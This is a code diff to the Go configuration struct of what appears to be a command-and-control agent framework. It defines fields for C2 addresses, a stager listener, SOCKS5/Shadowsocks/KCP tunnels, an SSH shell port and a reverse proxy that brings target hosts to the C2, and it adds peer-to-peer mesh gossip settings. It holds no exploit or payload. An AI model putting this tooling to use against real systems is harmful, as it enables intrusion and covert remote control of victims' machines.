@@ -15,25 +15,23 @@ func ReadCBORConfig(cborData []byte, config_to_write *Config) (err error) {
 
 // Config build.json config file
 type Config struct {
-	CCAddress                      string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
-	CCHost                         string `cbor:"2,keyasint"`  // Hostname of C2 server (hostname only)
-	CCPort                         string `cbor:"3,keyasint"`  // CC service port, TLS enabled
-	AgentSocksServerPort           string `cbor:"4,keyasint"`  // agent side socks5 proxy server port
-	AgentSocksTimeout              int    `cbor:"5,keyasint"`  // timeout (in seconds) for agent side Socks5 server, 0 to disable
-	StagerHTTPListenerPort         string `cbor:"6,keyasint"`  // For stager HTTP server
-	Password                       string `cbor:"7,keyasint"`  // password of shadowsocks, socks5 and SSH server
-	ShadowsocksLocalSocksPort      string `cbor:"8,keyasint"`  // socks5 port of shadowsocks
-	ShadowsocksServerPort          string `cbor:"9,keyasint"`  // server port of shadowsocks proxy server, can run on CC and agent
-	KCPServerPort                  string `cbor:"10,keyasint"` // server port of kcp server
-	KCPClientPort                  string `cbor:"11,keyasint"` // client port of kcp
-	UseKCP                         bool   `cbor:"12,keyasint"` // enable KCP for Shadowsocks C2 transport
-	EnableNCSI                     bool   `cbor:"13,keyasint"` // NCSI connectivity checking, disable when C2 is reachable but NCSI is not
-	SSHHostKey                     []byte `cbor:"14,keyasint"` // SSH host (private) key (PEM string), used by remote forwarding server
-	Bring2CCReverseProxyPort       string `cbor:"15,keyasint"` // Used to bring target host to C2, see Bring2CC
-	SSHDShellPort                  string `cbor:"16,keyasint"` // interactive shell
-	ProxyChainBroadcastPort        string `cbor:"17,keyasint"` // UDP port used for broadcasting msg, used by auto proxy chain
-	ProxyChainBroadcastIntervalMin int    `cbor:"18,keyasint"` // seconds, set max to 0 to disable
-	ProxyChainBroadcastIntervalMax int    `cbor:"19,keyasint"` // seconds, set max to 0 to disable
+	CCAddress                 string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
+	CCHost                    string `cbor:"2,keyasint"`  // Hostname of C2 server (hostname only)
+	CCPort                    string `cbor:"3,keyasint"`  // CC service port, TLS enabled
+	AgentSocksServerPort      string `cbor:"4,keyasint"`  // agent side socks5 proxy server port
+	AgentSocksTimeout         int    `cbor:"5,keyasint"`  // timeout (in seconds) for agent side Socks5 server, 0 to disable
+	StagerHTTPListenerPort    string `cbor:"6,keyasint"`  // For stager HTTP server
+	Password                  string `cbor:"7,keyasint"`  // password of shadowsocks, socks5 and SSH server
+	ShadowsocksLocalSocksPort string `cbor:"8,keyasint"`  // socks5 port of shadowsocks
+	ShadowsocksServerPort     string `cbor:"9,keyasint"`  // server port of shadowsocks proxy server, can run on CC and agent
+	KCPServerPort             string `cbor:"10,keyasint"` // server port of kcp server
+	KCPClientPort             string `cbor:"11,keyasint"` // client port of kcp
+	UseKCP                    bool   `cbor:"12,keyasint"` // enable KCP for Shadowsocks C2 transport
+	EnableNCSI                bool   `cbor:"13,keyasint"` // NCSI connectivity checking, disable when C2 is reachable but NCSI is not
+	SSHHostKey                []byte `cbor:"14,keyasint"` // SSH host (private) key (PEM string), used by remote forwarding server
+	Bring2CCReverseProxyPort  string `cbor:"15,keyasint"` // Used to bring target host to C2, see Bring2CC
+	SSHDShellPort             string `cbor:"16,keyasint"` // interactive shell
+	MeshGossipPort            string `cbor:"17,keyasint"` // UDP/TCP port for gossip (memberlist)
 	// Preflight Config
 	PreflightEnabled bool              `cbor:"20,keyasint"` // Enable preflight check
 	PreflightURL     string            `cbor:"21,keyasint"` // URL for preflight check
@@ -74,6 +72,15 @@ type Config struct {
 	IsRunByStager bool   `cbor:"59,keyasint"` // Whether the agent is run by a stager
 
 	MachineID string `cbor:"60,keyasint"` // machine ID
+
+	InitialPeers []string `cbor:"64,keyasint"` // Initial gossip bootstrap peers
+
+	// Mesh / P2P configuration
+	IsP2PEnabled      bool `cbor:"70,keyasint"` // set by generate --p2p
+	IsDirectC2Enabled bool `cbor:"71,keyasint"` // set by generate --direct-c2 (Gateway mode: P2P + direct C2 + preflight)
+
+	// Runtime state (not persisted in config file)
+	MyAgentToken *AgentToken `cbor:"-"` // Current AgentToken issued by C2
 }
 
 // This will be patched by the builder
